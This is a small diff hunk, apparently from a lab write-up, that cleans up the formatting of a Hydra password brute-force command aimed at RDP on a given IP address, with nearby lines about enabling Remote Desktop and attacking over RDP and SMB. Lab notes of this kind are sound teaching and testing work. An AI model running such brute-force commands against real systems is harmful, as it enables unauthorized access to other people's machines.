@@ -119,7 +119,7 @@ Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
 Ran Hydra against the endpoint over RDP and SMB:
 
 ```bash
-hydra -l jay -P \~/lab-wordlist.txt rdp://<192.2.42.137>
+hydra -l jay -P ~/lab-wordlist.txt rdp://192.2.42.137
 
 ```
 
